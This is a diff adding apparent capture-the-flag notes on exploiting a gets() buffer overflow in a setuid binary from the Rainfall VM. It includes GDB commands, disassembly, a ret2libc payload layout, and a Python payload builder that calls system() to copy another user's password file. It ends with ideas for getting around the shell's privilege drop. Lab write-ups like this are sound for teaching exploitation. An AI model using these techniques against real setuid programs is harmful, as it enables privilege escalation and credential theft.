@@ -1,0 +1,161 @@
+## Level1 Binary Analysis and Exploitation
+
+### Quick Facts
+- Binary: /home/user/level1/level1
+- Type: ELF 32-bit Intel x86
+- Permissions: -rwsr-s---+ (setuid/setgid level2)
+- Vulnerability: Buffer overflow in main() via gets()
+
+### Memory Layout (from ltrace)
+- Buffer address: 0xbffffcd0
+- Buffer size: 64 bytes (gets() can read more)
+- Stack allocated: 80 bytes (0x50)
+- Buffer offset from ESP: 0x10 (16 bytes)
+
+### GDB Address Discovery
+```bash
+gdb -batch ./level1 <<EOF
+file ./level1
+break main
+run < /dev/null
+print/x (int)system
+print/x (int)exit
+find 0xb7e00000, 0xb8000000, "/bin/sh"
+quit
+EOF
+```
+
+Results:
+- system() = 0xb7e6b060
+- exit() = 0xb7e5ebe0
+- "/bin/sh" = 0xb7f8cc58 (found at this address in libc memory)
+
+### Disassembly of main()
+Objdump output:
+```
+08048480 <main>:
+ 8048480:	55                   	push   %ebp
+ 8048481:	89 e5                	mov    %esp,%ebp
+ 8048483:	83 e4 f0             	and    $0xfffffff0,%esp
+ 8048486:	83 ec 50             	sub    $0x50,%esp
+ 8048489:	8d 44 24 10          	lea    0x10(%esp),%eax
+ 804848d:	89 04 24             	mov    %eax,(%esp)
+ 8048490:	e8 ab fe ff ff       	call   8048340 <gets@plt>
+ 8048495:	c9                   	leave
+ 8048496:	c3                   	ret
+```
+
+Key observations:
+1. Line 8048486: `sub $0x50,%esp` = 80 bytes allocated on stack
+2. Line 8048489: `lea 0x10(%esp),%eax` = buffer at ESP+16
+3. Line 8048490: `call 8048340 <gets@plt>` = vulnerable call to gets()
+
+### Stack Overflow Mechanism
+When gets() reads input:
+- It reads until newline
+- No bounds checking on buffer
+- Input longer than 64 bytes overwrites stack
+
+Example with 100-byte input:
+- Bytes 0-63: fill buffer
+- Bytes 64-67: overwrite saved EBP
+- Bytes 68-71: overwrite return address ← WE CONTROL THIS
+- Bytes 72+: extra data (may cause crash if badly formatted)
+
+### Crafting the Exploit Payload
+
+For ret2libc attack, we need:
+1. system() function address
+2. exit() function address (return from system)
+3. Address of "/bin/sh" string
+4. Correct stack frame for calling convention
+
+Payload bytes:
+- 0-71: padding (72 bytes of 'A')
+- 72-75: system() address = 0xb7e6b060 (little-endian)
+- 76-79: exit() address = 0xb7e5ebe0 (little-endian)
+- 80-83: /bin/sh pointer = 0xb7f8cc58 (little-endian)
+
+### Verification Commands
+
+1. Confirm buffer overflow:
+```bash
+perl -e 'print "A" x 100' | ./level1  # Should segfault with exit code 139
+```
+
+2. Confirm system() is called:
+```bash
+# Create payload that writes output
+python3 << 'EOF'
+import struct
+cmd = b"cat /home/user/level2/.pass > /tmp/out\x00"
+p = cmd + b'X'*(64-len(cmd)) + b'BBBB'
+p += struct.pack('<I', 0xb7e6b060) + struct.pack('<I', 0xb7e5ebe0)
+p += struct.pack('<I', 0xbffffcd0)
+with open('/tmp/p', 'wb') as f: f.write(p)
+EOF
+
+cat /tmp/p | ./level1
+cat /tmp/out 2>&1  # Should show permission denied (proves system() was called)
+```
+
+3. Check ASLR:
+```bash
+cat /proc/sys/kernel/randomize_va_space  # Should be 0 (disabled)
+```
+
+### The Setuid Privilege Drop Issue
+
+Problem:
+- level1 binary owned by level2 with setuid bit
+- Successfully calls system("/bin/sh")
+- BUT /bin/sh drops setuid privileges for security
+- Spawned shell runs as level1, not level2
+- Cannot read /home/user/level2/.pass
+
+Evidence:
+```
+(payload) | ./level1
+# Spawned shell cannot read level2's files
+# "permission denied" errors confirm attempted access with level1 privileges
+```
+
+### Potential Solutions (Research Needed)
+
+1. /bin/bash -p flag
+   - Bash has -p flag to preserve setuid privileges
+   - Try pointing system() to bash instead of sh
+   - Would need to find /bin/bash in memory or use different approach
+
+2. ROP Chain
+   - Use return-oriented programming to call setuid(0)
+   - Then call execve("/bin/sh")
+   - More complex but avoids privilege drop
+
+3. Different Entry Point
+   - Maybe exploit different function
+   - Maybe use different syscall entirely
+   - Check if level1 has other exploitable code paths
+
+4. Wrapper Script
+   - Create a setuid wrapper in /tmp
+   - Call wrapper through system()
+   - Wrapper then executes real command
+
+### Environment Info
+- ASLR: Disabled (randomize_va_space = 0)
+- NX Bit: Disabled
+- Kernel: Linux 2.6.24+
+- Libc: glibc 2.15 (typical for old Rainfall VM)
+- Architecture: i386 (32-bit Intel x86)
+
+### References
+- Buffer Overflow Exploitation: https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/return-to-libc-ret2libc
+- Return-to-libc Technique: Stack exploitation with disabled NX
+- Gets() Vulnerability: https://man7.org/linux/man-pages/man3/gets.3.html (deprecated, vulnerable)
+
+### Next Steps
+- Test bash -p approach
+- Research ROP chains for i386
+- Check if there's alternative Rainfall solution method
+- Verify if this is the expected solution path
